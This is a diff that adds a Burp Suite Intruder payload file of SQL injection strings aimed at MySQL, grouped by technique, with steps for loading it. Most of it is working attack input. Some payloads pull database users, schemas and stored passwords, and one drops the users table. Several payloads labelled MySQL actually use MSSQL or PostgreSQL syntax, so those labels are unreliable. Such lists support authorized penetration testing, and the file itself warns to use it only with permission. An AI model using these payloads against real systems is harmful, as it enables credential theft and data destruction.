@@ -1,0 +1,86 @@
+# ============================================================================
+# BURP SUITE INTRUDER PAYLOAD LIST
+# Tool    : SQL Injection Payload Generator
+# Author  : Offensive Team Zeta - ITSOLERA (PVT) LTD
+# Created : 2026-02-20 18:30:04
+# Target  : MYSQL database
+# Usage   : Burp Suite > Intruder > Payloads > Load > (this file)
+# WARNING : Use ONLY on authorized targets with written permission
+# ============================================================================
+
+# HOW TO USE:
+#   1. Open Burp Suite → Proxy → Intercept a request
+#   2. Right-click → Send to Intruder
+#   3. Intruder → Positions → mark your injection point (Add §)
+#   4. Intruder → Payloads → Payload type: Simple list
+#   5. Click Load → select this file
+#   6. Click Start Attack (authorized lab / DVWA ONLY)
+
+# ============================================================================
+# ERROR BASED — MYSQL
+# ============================================================================
+# [Easy] Extract MySQL version through CONVERT function error
+1' AND 1=CONVERT(int, (SELECT @@version))--
+# [Medium] Extract current database user using extractvalue() function
+1' AND extractvalue(rand(), concat(0x3a, (SELECT user())))--
+# [Medium] Extract database name using updatexml() function
+1' AND updatexml(1, concat(0x3a, (SELECT database())), 1)--
+# [Hard] Extract table names from information_schema
+1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (SELECT table_name FROM information_schema.tables LIMIT 1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--
+# [Hard] Extract user credentials using GeoHash function error
+1' AND ST_LatFromGeoHash((SELECT CONCAT(user, ':', password) FROM users LIMIT 1))--
+
+# ============================================================================
+# UNION BASED — MYSQL
+# ============================================================================
+# [Easy] Extract basic database information via UNION
+1' UNION SELECT NULL, user(), version(), database()--
+# [Medium] Extract all tables and columns from current database
+1' UNION SELECT table_name, column_name, NULL, NULL FROM information_schema.columns WHERE table_schema=database()--
+# [Medium] Extract and concatenate all tables and columns
+1' UNION SELECT GROUP_CONCAT(table_name), GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_schema=database()--
+# [Medium] Extract schema of 'users' table
+1' UNION SELECT column_name, data_type, column_key, NULL FROM information_schema.columns WHERE table_name='users'--
+# [Easy] Extract user credentials directly
+1' UNION SELECT username, password, email, NULL FROM users WHERE 1=1--
+
+# ============================================================================
+# BOOLEAN BLIND — MYSQL
+# ============================================================================
+# [Hard] Boolean blind: Verify database accessibility
+1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--
+# [Hard] Boolean blind: Extract username length
+1' AND (SELECT LENGTH(user())) > 5--
+# [Very Hard] Boolean blind: Check username patterns
+1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%') > 0--
+# [Hard] Boolean blind: Table record counting
+1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 100 THEN 1 ELSE 0 END) = 1--
+
+# ============================================================================
+# TIME BASED — MYSQL
+# ============================================================================
+# [Hard] Time-based blind: Sleep function delay
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+# [Hard] Time-based blind: Conditional sleep based on count
+1' AND IF((SELECT COUNT(*) FROM users) > 10, SLEEP(5), 0)--
+# [Very Hard] Time-based blind: MSSQL WAITFOR command
+1' OR 1=1; WAITFOR DELAY '00:00:05'--
+# [Very Hard] Time-based blind: PostgreSQL pg_sleep function
+1' AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+# ============================================================================
+# COMMENT BYPASS — MYSQL
+# ============================================================================
+# [Easy] Basic quote bypass without comments
+1' OR '1'='1
+# [Easy] Hash comment (#) bypass in MySQL
+1' UNION SELECT NULL#
+# [Easy] Block comment bypass (/*...*/)
+1' UNION SELECT NULL,NULL/*
+# [Medium] Stacked query comment bypass
+1'; DROP TABLE users; --
+# [Easy] PostgreSQL double-dash comment bypass
+1' AND '1'='1' --
+# [Easy] MSSQL comment bypass
+1' OR '1'='1' /*
+
